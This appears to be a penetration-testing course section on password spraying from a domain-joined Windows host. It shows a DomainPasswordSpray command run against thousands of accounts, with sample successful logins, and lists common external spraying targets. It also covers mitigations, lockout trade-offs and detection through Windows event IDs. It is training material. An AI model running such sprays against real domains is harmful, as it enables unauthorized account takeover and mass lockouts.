

---

From a foothold on a domain-joined Windows host, the **DomainPasswordSpray** tool is highly effective.

If authenticated to the domain, the tool will automatically:

- Generate a user list from Active Directory.
    
- Query the domain password policy.
    
- Exclude user accounts that are within one failed attempt of being locked out.
    

Just as with password spraying from a Linux host, a custom user list can also be supplied when operating from a Windows host that is **not authenticated** to the domain.

This situation commonly occurs when:

- Performing an assessment from a managed Windows workstation.
    
- Working from an on-site Windows VM.
    
- Obtaining an initial foothold through another attack vector and attempting to escalate privileges by compromising accounts with greater permissions.
    

---

# Using DomainPasswordSpray.ps1

Several options are available with the tool.

Since the host is already domain-joined, we can omit the `-UserList` parameter and allow the tool to generate the user list automatically.

We specify:

- `-Password` to define the password being sprayed.
    
- `-OutFile` to save successful authentications for later use.
    

## Example

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1

PS C:\htb> Invoke-DomainPasswordSpray `
    -Password Welcome1 `
    -OutFile spray_success `
    -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to minutes.
[*] Setting a minute wait in between sprays.

Confirm Password Spray

Are you sure you want to perform a password spray against 2923 accounts?

[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with 1 passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users.
[*] Current time is 2:57 PM
[*] Writing successes to spray_success

[*] SUCCESS! User: sgage     Password: Welcome1
[*] SUCCESS! User: tjohnson  Password: Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

---

`Kerbrute` can also be used to perform the same user enumeration and password spraying techniques demonstrated previously.

If using the provided Windows host, the tool is available in:

```text
C:\Tools
```

---

# Mitigations

Several defensive measures can significantly reduce the effectiveness of password spraying attacks.

Although no single control completely prevents this attack, implementing multiple layers of defense makes successful exploitation substantially more difficult.

|Technique|Description|
|---|---|
|**Multi-factor Authentication (MFA)**|MFA greatly reduces the effectiveness of password spraying attacks. Examples include push notifications, TOTP applications (Google Authenticator), RSA tokens, and SMS verification. However, some MFA implementations still reveal whether the username/password combination is valid, allowing attackers to reuse credentials elsewhere. MFA should therefore be enforced on all external services.|
|**Restricting Access**|Users should only have access to applications required for their role. Restricting unnecessary authentication opportunities follows the Principle of Least Privilege and reduces the attack surface.|
|**Reducing the Impact of Successful Exploitation**|Administrative users should maintain separate privileged accounts. Application-specific permissions and network segmentation further limit lateral movement after a compromise.|
|**Password Hygiene**|Strong passphrases, password filtering, and blocking common dictionary words, seasons, months, and company-related names make password spraying significantly less effective.|

---

# Other Considerations

Password lockout policies should be carefully configured.

An overly restrictive lockout policy requiring manual administrative intervention may itself become a denial-of-service vector, allowing an attacker to lock numerous accounts through careless or malicious password spraying.

Security controls should balance usability and protection.

---

# Detection

Several indicators may reveal an ongoing password spraying attack:

- Numerous account lockouts within a short period.
    
- Authentication logs containing repeated login attempts.
    
- Large numbers of authentication requests against a single application or URL.
    
- Failed logins involving both valid and nonexistent users.
    

---

## Windows Event Logs

### Event ID 4625

```
An account failed to log on
```

A large number of **Event ID 4625** entries over a short period may indicate password spraying activity.

Organizations should implement SIEM correlation rules to detect excessive authentication failures within a defined time window.

---

### Event ID 4771

```
Kerberos pre-authentication failed
```

Sophisticated attackers may avoid SMB authentication and instead target LDAP or Kerberos.

Monitoring **Event ID 4771** can help identify Kerberos-based password spraying attacks.

> **Note**
> 
> Kerberos logging must be enabled before these events become available for monitoring.

---

With properly configured logging, monitoring, and layered security controls, organizations are significantly better positioned to detect and respond to both internal and external password spraying attacks.

---

# External Password Spraying

Although outside the primary scope of this module, password spraying is also a common technique used by attackers to gain an initial foothold through internet-facing services.

During penetration tests, this method frequently leads to access to:

- Email accounts
    
- Internal portals
    
- Web applications
    
- Sensitive corporate data
    

---

## Common Targets

- Microsoft 365
    
- Outlook Web Exchange (OWA)
    
- Exchange Web Access (EWA)
    
- Skype for Business
    
- Lync Server
    
- Microsoft Remote Desktop Services (RDS)
    
- Citrix portals using Active Directory authentication
    
- VMware Horizon VDI environments
    
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc.)
    
- Custom web applications using Active Directory authentication
    

---

# Moving Deeper

Now that several valid credentials have been obtained, credentialed enumeration can begin.

Various complementary tools can be used together to build a comprehensive understanding of the Active Directory environment.

The information gathered during this phase enables:

- Lateral movement
    
- Vertical privilege escalation
    
- Identification of high-value assets
    
- Progression toward the overall objectives of the assessment